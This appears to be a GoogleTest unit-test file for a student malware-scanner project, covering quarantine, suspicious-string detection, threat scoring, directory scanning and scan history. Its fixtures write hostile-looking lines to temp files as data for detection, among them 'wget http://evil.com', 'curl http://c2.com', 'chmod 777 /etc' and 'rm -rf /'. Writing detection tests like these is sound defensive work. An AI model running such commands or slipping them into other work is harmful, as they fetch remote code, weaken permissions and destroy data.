// =============================================================================
// Unit Tests for Cyber Capstone Project (5 tests)
//
// Build:
//   g++ -std=c++17 test_capstone_5.cpp file_scanner.cpp ScanHistoryManager.cpp \
//       -lgtest -lgtest_main -pthread -o test_capstone_5
//   ./test_capstone_5
// =============================================================================

#include <gtest/gtest.h>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <chrono>

#include "file_scanner.cpp"
#include "ScanHistoryManager.h"

namespace fs = std::filesystem;

// Helper: creates a temp file and auto-deletes it when out of scope
struct TempFile {
    std::string path;
    TempFile(const std::string& name, const std::string& content)
        : path("/tmp/capstone_test_" + name) {
        std::ofstream(path) << content;
    }
    ~TempFile() { fs::remove(path); }
};

// -----------------------------------------------------------------------------
// Test 1: BubblewrapQuarantine — quarantine, list, and delete a file
// -----------------------------------------------------------------------------

// quarantine.cpp defines its own main(); strip it out before including
#define main quarantine_main
#include "quarantine.cpp"
#undef main

TEST(Quarantine, QuarantineListAndDelete) {
    std::string qdir = "/tmp/capstone_qtest_dir";
    std::string qlog = "/tmp/capstone_qtest.log";
    fs::remove_all(qdir);

    BubblewrapQuarantine q(qdir, qlog);

    // Create a temp file to quarantine
    TempFile victim("victim.sh", "#!/bin/bash\necho evil\n");

    // Quarantine it — should succeed and remove the original
    EXPECT_TRUE(q.quarantineFile(victim.path, "test reason"));
    EXPECT_FALSE(fs::exists(victim.path));  // original removed

    // At least one file should now be in the quarantine dir
    int count = 0;
    for (const auto& e : fs::directory_iterator(qdir))
        if (e.path().extension() != ".metadata") count++;
    EXPECT_GE(count, 1);

    // Quarantining a non-existent file should fail gracefully
    EXPECT_FALSE(q.quarantineFile("/tmp/no_such_file_xyz.sh"));

    fs::remove_all(qdir);
    fs::remove(qlog);
}

// -----------------------------------------------------------------------------
// Test 2: scan_suspicious_strings() — commented-out strings are ignored
// -----------------------------------------------------------------------------
TEST(ScanSuspiciousStrings, CommentedLinesNotCounted) {
    TempFile f("commented.sh",
               "# /bin/bash -i\n"
               "# wget http://evil.com\n"
               "// system(\"rm -rf /\");\n");
    EXPECT_EQ(scan_suspicious_strings(f.path), 0);
}

// -----------------------------------------------------------------------------
// Test 3: scan_file() — correct threat levels returned
// -----------------------------------------------------------------------------
TEST(ScanFile, ThreatLevelsCorrect) {
    TempFile clean("clean.sh", "#!/bin/bash\necho Hello\n");
    EXPECT_EQ(scan_file(clean.path), 1);  // 1 = safe

    TempFile suspicious("suspicious.sh",
                        "/bin/bash -i\nwget http://evil.com\nchmod +x x\n");
    EXPECT_EQ(scan_file(suspicious.path), 2);  // 2 = suspicious (3–4 hits)

    TempFile malicious("malicious.sh",
                       "/bin/bash -i\nwget http://evil.com\ncurl http://c2.com\n"
                       "chmod 777 /etc\nexec(cmd)\neval(code)\n");
    EXPECT_EQ(scan_file(malicious.path), 3);  // 3 = malicious (5+ hits)
}

// -----------------------------------------------------------------------------
// Test 4: scan_directory() — recursively finds and classifies files
// -----------------------------------------------------------------------------
TEST(ScanDirectory, RecursivelyClassifiesFiles) {
    std::string dir = "/tmp/capstone_test_dir";
    fs::create_directories(dir + "/sub");

    std::ofstream(dir + "/clean.sh")         << "echo hi\n";
    std::ofstream(dir + "/config.json")      << "{}";           // whitelisted
    std::ofstream(dir + "/sub/malware.sh")   <<
        "/bin/bash -i\nwget http://x\ncurl http://x\n"
        "chmod 777 /\nexec(x)\neval(y)\n";

    std::vector<std::pair<std::string, int>> results;
    scan_directory(dir, results);
    fs::remove_all(dir);

    ASSERT_EQ(results.size(), 3u);

    int skipped = 0, clean = 0, malicious = 0;
    for (auto& [path, code] : results) {
        if (code == 0) skipped++;
        if (code == 1) clean++;
        if (code == 3) malicious++;
    }
    EXPECT_EQ(skipped,   1);
    EXPECT_EQ(clean,     1);
    EXPECT_EQ(malicious, 1);
}

// -----------------------------------------------------------------------------
// Test 5: ScanHistoryManager — search, filter, and 90-day purge
// -----------------------------------------------------------------------------
TEST(ScanHistoryManager, SearchFilterAndPurge) {
    ScanHistoryManager mgr;

    // Add a recent record with a threat
    Threat t;
    t.name     = "Trojan.Dropper";
    t.filePath = "/tmp/evil.sh";

    ScanRecord recent;
    recent.scanType    = "quick";
    recent.timestamp   = std::chrono::system_clock::now();
    recent.threats     = {t};
    mgr.addRecord(recent);

    // Add an old record (91 days ago) — should be purged
    ScanRecord old;
    old.scanType  = "full";
    old.timestamp = std::chrono::system_clock::now() - std::chrono::hours(24 * 91);
    mgr.addRecord(old);

    // Only the recent record should be visible
    EXPECT_EQ(mgr.getAllVisible().size(), 1u);

    // Search by threat name (case-insensitive)
    EXPECT_EQ(mgr.search("trojan", "", false).size(), 1u);
    EXPECT_EQ(mgr.search("TROJAN", "", false).size(), 1u);

    // Filter: onlyWithThreats
    EXPECT_EQ(mgr.search("", "", true).size(), 1u);

    // Search for something that doesn't exist
    EXPECT_TRUE(mgr.search("ransomware", "", false).empty());
}
